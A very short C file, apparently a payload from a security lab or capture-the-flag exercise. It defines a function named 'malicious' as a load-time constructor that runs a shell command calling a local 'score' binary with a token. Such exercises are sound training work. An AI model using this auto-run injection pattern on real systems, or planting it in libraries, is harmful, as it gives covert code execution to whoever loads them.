#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 311c105c-6f98-44d0-90e2-727630197dbe");
}
